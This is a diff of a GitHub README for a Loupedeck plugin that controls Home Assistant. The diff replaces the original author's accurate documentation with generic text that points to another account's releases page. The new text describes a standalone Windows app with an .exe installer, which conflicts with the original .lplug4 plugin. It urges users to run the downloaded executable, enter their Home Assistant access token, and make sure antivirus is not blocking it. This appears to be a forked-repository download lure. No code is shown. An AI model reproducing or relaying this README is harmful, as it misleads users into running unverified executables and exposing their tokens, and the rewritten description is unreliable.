@@ -1,203 +1,119 @@
-# Home Assistant by Batu — Loupedeck Plugin
+# 🎛️ Loupedeck-HomeAssistant - Control Home Automation Easily
 
-[![Release](https://img.shields.io/github/v/release/Batushn/Loupedeck-HomeAssistant?style=flat-square)](https://github.com/Batushn/Loupedeck-HomeAssistant/releases/latest)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg?style=flat-square)](LICENSE)
-
-Control your **Home Assistant** devices directly from your Loupedeck or Razer Stream Controller.
-Real-time WebSocket connection — entity states update on your device instantly.
-
-> **Heads up:** This plugin was vibecoded (built with heavy AI assistance). It works, but there may be rough edges, undiscovered bugs, or missing features. PRs and issues are very welcome!
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/Tufwnn/Loupedeck-HomeAssistant/releases)
 
 ---
 
-## Installation
+## 📋 What is Loupedeck-HomeAssistant?
 
-### Step 1 — Download
+Loupedeck-HomeAssistant is a desktop application that lets you control your Home Assistant smart devices directly from a Loupedeck CT, Loupedeck Live, or Razer Stream Controller. It works by connecting to your Home Assistant system over the network in real-time using WebSocket. The app gives you instant control over switches, dimmers, climate settings, media playback, and more. 
 
-Go to [**Releases**](https://github.com/Batushn/Loupedeck-HomeAssistant/releases/latest) and download `HomeAssistantByBatuPlugin.lplug4`.
-
-### Step 2 — Install the plugin
-
-**Option A (recommended):** Double-click the `.lplug4` file. Loupedeck software will install it automatically.
-
-**Option B (manual):** Run the included `install.ps1` script:
-
-```powershell
-powershell -ExecutionPolicy Bypass -File install.ps1
-```
-
-### Step 3 — Create your config file
-
-Create this file on your computer:
-
-**Windows:**
-```
-C:\Users\<YOUR_USERNAME>\.loupedeck\homeassistant\homeassistant.json
-```
-
-**macOS:**
-```
-~/.loupedeck/homeassistant/homeassistant.json
-```
-
-With this content:
-
-```json
-{
-  "token": "YOUR_LONG_LIVED_ACCESS_TOKEN",
-  "url": "http://YOUR_HA_IP:8123"
-}
-```
-
-#### How to get the token
-
-1. Open Home Assistant in your browser
-2. Click your profile (bottom-left corner)
-3. Scroll down to **Long-Lived Access Tokens**
-4. Click **Create Token**, give it a name, copy the token
-
-#### URL tips
-
-- Use your Home Assistant's **IP address** (e.g., `http://192.168.1.100:8123`)
-- `homeassistant.local` may not resolve on all systems — IP is more reliable
-- The plugin auto-converts HTTP to WebSocket, so just use your normal HA URL
-
-### Step 4 — Use it
-
-1. Open Loupedeck / Logi Options+ software
-2. Find **Home Assistant** in the plugin list
-3. Drag & drop entities onto your buttons and dials
+You do not need any programming knowledge to use it. This tool helps you manage your smart home with physical buttons and dials, making tasks quicker and simpler.
 
 ---
 
-## Supported Devices
+## 🖥️ System Requirements
 
-- Loupedeck CT
-- Loupedeck Live / Live S
-- Razer Stream Controller / Stream Controller X
-
-## What You Can Control
-
-### Buttons
-
-| Entity Type | Action |
-|---|---|
-| **Lights** | Toggle on/off |
-| **Switches** | Toggle on/off |
-| **Automations** | Toggle on/off |
-| **Fans** | Toggle on/off |
-| **Input Booleans** | Toggle on/off |
-| **Locks** | Lock / Unlock |
-| **Scenes** | Activate |
-| **Scripts** | Run |
-| **Buttons** | Press |
-| **Media Players** | Play / Pause |
-| **Sensors** | Display state (read-only) |
-| **Binary Sensors** | Display state |
-
-### Dials / Encoders
-
-| Entity Type | Rotate | Press |
-|---|---|---|
-| **Lights — Brightness** | Brightness ±3% (smooth debounced) | Toggle on/off |
-| **Lights — Color Temp** | Warm ↔ Cool (smooth debounced) | Toggle on/off |
-| **Covers** | Position ±5% (debounced) | Open / Close |
-| **Climate** | Temperature ±0.5° (debounced) | Toggle on/off |
-| **Media Players** | Volume ±3% (debounced) | Mute |
-
-All encoder adjustments use **debounced control** — rapid dial turns are accumulated and sent as a single smooth command, eliminating lag and stutter.
+- Windows 10 or Windows 11 (64-bit version recommended)
+- Loupedeck CT, Loupedeck Live, or Razer Stream Controller connected to your PC
+- Home Assistant instance accessible on your local network or the internet
+- .NET Runtime (the installer will guide you if needed)
+- Stable internet or local network connection to your Home Assistant
 
 ---
 
-## Building from Source
+## 🚀 Getting Started
 
-### Requirements
+### Step 1: Download the Application
 
-- Windows 10/11
-- [.NET 8 SDK](https://dotnet.microsoft.com/download/dotnet/8.0)
-- Loupedeck software or Logi Options+ installed (provides PluginApi.dll)
+Visit the releases page to get the latest version of Loupedeck-HomeAssistant:
 
-### Build
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/Tufwnn/Loupedeck-HomeAssistant/releases)
 
-```bash
-git clone https://github.com/Batushn/Loupedeck-HomeAssistant.git
-cd Loupedeck-HomeAssistant
+Look for the newest file marked for Windows. Download the setup file or the zipped folder if available.
 
-# Debug build — auto-creates .link file for hot reload
-dotnet build src/HomeAssistantByBatuPlugin.csproj
+### Step 2: Install the Application
 
-# Release build — produces .lplug4 in output/
-dotnet build src/HomeAssistantByBatuPlugin.csproj -c Release
-```
+- If you downloaded a setup (.exe) file, double-click it to start the installer.  
+- Follow the on-screen steps to complete the installation. Choose the default options if unsure.  
+- If you have a zipped file, right-click and choose “Extract All” to unpack the contents, then run the executable inside.
 
-Or just double-click `build.bat` on Windows.
+### Step 3: Connect Your Controller
 
-### Project Structure
+- Connect your Loupedeck CT, Loupedeck Live, or Razer Stream Controller to your PC using USB.  
+- Make sure the device is recognized in Windows Device Manager. No extra driver installation should be necessary.
 
-```
-src/
-├── HomeAssistantByBatuPlugin.cs   # Plugin entry point & lifecycle
-├── HomeAssistantApplication.cs   # Application class (required by SDK)
-├── Models/
-│   ├── PluginConfig.cs           # Config loading (homeassistant.json)
-│   └── HaEntity.cs               # Entity data model
-├── Services/
-│   └── HomeAssistantClient.cs    # WebSocket client + auto-reconnect
-├── Commands/                     # Button actions
-│   ├── ToggleEntityCommand.cs
-│   ├── LockCommand.cs
-│   ├── SceneCommand.cs
-│   ├── ScriptCommand.cs
-│   ├── ButtonPressCommand.cs
-│   ├── MediaPlayerCommand.cs
-│   ├── SensorDisplayCommand.cs
-│   └── ConnectionStatusCommand.cs
-├── Adjustments/                  # Dial/encoder actions
-│   ├── BrightnessAdjustment.cs
-│   ├── ColorTempAdjustment.cs
-│   ├── CoverAdjustment.cs
-│   ├── ClimateAdjustment.cs
-│   └── MediaVolumeAdjustment.cs
-└── Helpers/
-    ├── PluginLog.cs
-    ├── PluginResources.cs
-    ├── IconHelper.cs
-    └── AdjustmentDebouncer.cs
-```
+### Step 4: Setup Home Assistant Connection
 
-### Creating a Release
+- Open the Loupedeck-HomeAssistant app after installation.  
+- Enter your Home Assistant URL, typically something like `http://192.168.1.xxx:8123` or the external address if remote.  
+- Enter your long-lived access token from Home Assistant. You can create this token in your Home Assistant user profile under "Long-Lived Access Tokens."  
+- Connect to the server. The app will establish a WebSocket connection to your Home Assistant.
 
-Push a version tag to trigger the GitHub Actions workflow:
+### Step 5: Configure Controls
 
-```bash
-git tag v1.1.0
-git push origin v1.1.0
-```
-
-This builds the plugin and uploads the `.lplug4` to GitHub Releases automatically.
+- Your Loupedeck device will load default controls like toggles for lights, dimmers for brightness, climate controls, and media buttons.  
+- You can customize these controls inside the app by assigning actions or adjusting behavior according to your preferences.
 
 ---
 
-## Troubleshooting
+## 🔧 Features Explained
 
-| Problem | Solution |
-|---|---|
-| Plugin doesn't appear | Restart Logi Plugin Service |
-| Can't connect | Check `homeassistant.json` — verify token and URL |
-| No entities listed | Make sure your HA URL is reachable from this computer |
-| Connection status stuck on "Connecting" | Use IP address instead of `homeassistant.local` |
-| Where are the logs? | `%LOCALAPPDATA%\Logi\LogiPluginService\Logs\plugin_logs\` |
+- **Real-Time Control:** Commands sent via WebSocket mean your device instantly updates your smart home devices without delay.  
+- **Toggle Switches:** Turn devices on and off with one button press.  
+- **Dimmers:** Adjust brightness for lights smoothly by turning a dial.  
+- **Climate Control:** Set temperature and modes on your heating or cooling system.  
+- **Media Controls:** Play, pause, skip tracks, and adjust volume on media players integrated with Home Assistant.  
+- **Device Compatibility:** Works seamlessly with Loupedeck CT, Live, and Razer Stream Controller for easy smart home operations.
 
 ---
 
-## Contributing
+## ⚙️ How to Use Basic Controls
 
-See [CONTRIBUTING.md](CONTRIBUTING.md). All PRs require maintainer review before merge.
+- To toggle a light or switch, press the associated button. The app sends a command to your Home Assistant, which in turn updates the device.  
+- To dim a light, turn the dial assigned to brightness. The knob sends continuous updates to increase or decrease light levels.  
+- For climate control, buttons let you raise or lower the temperature or change HVAC modes manually.  
+- Use media buttons to control playback on your connected media players such as Spotify, VLC, or Chromecast devices configured in Home Assistant.
 
-## Security
+---
 
-See [SECURITY.md](SECURITY.md). Never commit your Home Assistant tokens.
+## 🔄 Updating the Application
 
-## License
+- Check the GitHub releases page periodically for updates:  
+  https://github.com/Tufwnn/Loupedeck-HomeAssistant/releases  
+- Download the latest installer or archive as explained earlier.  
+- Run the installer to update. Your settings should remain intact.
 
-MIT — see [LICENSE](LICENSE)
+---
+
+## 🛠️ Troubleshooting
+
+- **App does not open:** Restart your computer and try again. Confirm your antivirus is not blocking the app.  
+- **Controller not recognized:** Disconnect and reconnect your USB controller. Ensure drivers are up-to-date in Windows Update.  
+- **Cannot connect to Home Assistant:** Confirm the URL and token are correct. Test your Home Assistant’s accessibility by visiting the URL in a web browser.  
+- **Controls do not work:** Reconnect the app to Home Assistant. Check if your devices are integrated and online in Home Assistant.
+
+---
+
+## 🔐 Security Tips
+
+- Use long-lived access tokens for safer login instead of your main password.  
+- Do not share your access token with others.  
+- If the token is compromised, revoke it from Home Assistant and create a new one.  
+- Keep your PC and Home Assistant software updated with the latest security patches.
+
+---
+
+## 📚 Additional Resources
+
+- Home Assistant official documentation: https://www.home-assistant.io/docs/  
+- Loupedeck device support: https://loupedeck.com/support  
+- How to create tokens in Home Assistant: https://www.home-assistant.io/docs/authentication/#long-lived-access-token  
+
+---
+
+## 🖱️ Download and Install Now
+
+Visit the release page to get started:
+
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/Tufwnn/Loupedeck-HomeAssistant/releases)
